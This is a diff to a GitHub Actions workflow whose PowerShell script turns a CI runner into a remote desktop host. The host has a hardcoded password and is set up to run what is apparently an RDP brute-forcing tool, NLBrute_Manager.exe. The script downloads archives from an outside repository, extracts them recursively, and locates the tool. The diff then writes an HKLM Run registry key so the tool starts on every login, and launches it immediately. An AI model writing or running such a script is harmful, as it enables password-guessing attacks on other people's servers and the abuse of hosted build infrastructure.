@@ -38,7 +38,7 @@ jobs:
           Write-Host "  Password     : P@ssw0rd1qazXSW@#" -ForegroundColor Yellow
           Write-Host "==================================================" -ForegroundColor Green
 
-      - name: 4. Deploy and Launch via Interactive Task
+      - name: 4. Deploy and Force Autostart
         shell: powershell
         run: |
           # 1. Setup Workspace
@@ -62,13 +62,13 @@ jobs:
             "https://raw.githubusercontent.com/desimetr/lagi/main/multinl_zip.zip"
           )
 
-          Write-Host "Downloading initial files..." -ForegroundColor Yellow
+          Write-Host "Downloading files..." -ForegroundColor Yellow
           foreach ($url in $filesToDownload) {
               $fileName = Split-Path $url -Leaf
               Invoke-WebRequest -Uri $url -OutFile "$workDir\$fileName"
           }
 
-          # 4. Deep Extraction Loop
+          # 4. Deep Extraction Loop (Recursive)
           Write-Host "Starting Aggressive Extraction..." -ForegroundColor Cyan
           $maxIterations = 5
           $iteration = 0
@@ -76,7 +76,7 @@ jobs:
 
           while ($foundZip -and $iteration -lt $maxIterations) {
               $iteration++
-              Write-Host "Iteration number: ${iteration}" -ForegroundColor Yellow
+              Write-Host "Iteration: ${iteration}" -ForegroundColor Yellow
               $zips = Get-ChildItem -Path $workDir -Filter "*.zip" -Recurse
               if ($zips.Count -eq 0) { $foundZip = $false } 
               else {
@@ -90,7 +90,7 @@ jobs:
               }
           }
 
-          # 5. Find the specific EXE
+          # 5. Targeted Search and Registry Injection
           $targetExeName = "NLBrute_Manager.exe"
           $exeFile = Get-ChildItem -Path $workDir -Filter $targetExeName -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
@@ -99,23 +99,21 @@ jobs:
               $exeDir = Split-Path $exePath -Parent
               Write-Host "SUCCESS! Found: $exePath" -ForegroundColor Green
 
-              # 6. THE INTERACTIVE FIX: Use Scheduled Task to force GUI visibility
-              # We create a task that runs as the local system but is set to run only when the user is logged in.
-              # This forces it into the interactive desktop session.
+              # --- THE CRITICAL FIX: REGISTRY STARTUP ---
+              # We inject into HKLM (System wide) so it triggers on ANY login.
+              # We use a CMD wrapper to ensure it changes to the correct directory first.
+              Write-Host "Injecting Registry Autostart..." -ForegroundColor Cyan
+              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+              $command = "cmd.exe /c cd /d `"$exeDir`" && start `"`"$targetExeName`""
               
-              Write-Host "Creating Interactive Launch Task..." -ForegroundColor Cyan
+              # Create the registry key to force the app to run on login
+              New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value $command -PropertyType String -Force | Out-Null
               
-              # We use a command to launch the app via cmd to ensure it spawns correctly
-              $launchCmd = "cmd.exe /c cd /d `"$exeDir`" && start `"`"$targetExeName`""
+              Write-Host "Registry configured. The app will launch on RDP Login." -ForegroundColor Green
               
-              # Create a scheduled task that runs immediately
-              # This bypasses the "Session 0" isolation issue
-              & schtasks /create /tn "AppLauncher" /tr "$launchCmd" /sc once /st 00:00 /rl highest /f | Out-Null
+              # 6. Immediate Launch Attempt (to try and get it running NOW)
+              Start-Process -FilePath $exePath -WorkingDirectory $exeDir -WindowStyle Normal
               
-              # Run the task immediately
-              & schtasks /run /tn "AppLauncher" | Out-Null
-              
-              Write-Host "Task triggered. The app will appear on the desktop once RDP session is active." -ForegroundColor Green
           } else {
               Write-Host "CRITICAL ERROR: $targetExeName not found!" -ForegroundColor Red
               Get-ChildItem -Path $workDir -Recurse | Select-Object FullName | Out-File "$workDir\debug.txt"
